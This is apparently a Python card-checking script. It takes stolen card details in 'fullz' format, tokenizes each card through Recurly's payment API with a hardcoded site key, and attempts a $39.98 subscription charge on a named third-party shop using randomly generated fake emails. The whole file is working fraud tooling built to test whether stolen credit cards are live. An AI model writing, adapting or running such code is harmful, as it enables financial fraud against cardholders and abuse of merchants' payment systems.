import httpx
import random
import time
import json
import uuid
import asyncio
from fake_useragent import UserAgent
import re
from FUNC.defs import *

def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
                return None

async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")
        
        user= "criehs4d"+str(random.randint(584, 5658))

        a=20
        if len(str(ano)) < 4:
            ano = int(str(a) + str(ano))

        bin = cc[:6]

        # print(bin)

        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://api.recurly.com',
            'priority': 'u=1, i',
            'referer': 'https://api.recurly.com/js/v1/field.html',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        data = {
            'first_name': 'jon',
            'last_name': 'lock',
            'country': 'US',
            'postal_code': '10080',
            'number': cc,
            'month': mes,
            'year': ano,
            'cvv': cvv,
            'version': '4.32.1',
            'key': 'ewr1-UOuCoHJCcOF92pDf26zeQ7',
            'deviceId': 'qXmOYpfjKVciRiij',
            'sessionId': 'fhB2i0ydPIUEtitO',
            'instanceId': 'lhxTV6QqrVsj20BW'
        }

        response = await session.post('https://api.recurly.com/js/v1/token', headers=headers, data=data)

        token_id = response.json().get('id')
        # print(token_id)

        params = {'action': 'recurly_subs_purchase'}

        json_data = {
            'plan': 'mtm-10mo-s',
            'addon': 'us-shipping',
            'bonus': 'promo-mtm15,promo-namechange',
            'pay_source': 'creditcard',
            'currency': 'USD',
            'email': f'{user}@gmail.com',
            'shirt': 'L',
            'shoe': 'M 8-9',
            'price': '39.98',
            'recurly_token': token_id,
            'first_six': bin,
            'card_brand': 'visa',
        }

        response = await session.post(
            'https://misstomrsbox.com/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            json=json_data,
        )


        print(response.text)

        return response.text


    
    except Exception as e:
        print(e)
        return str(e)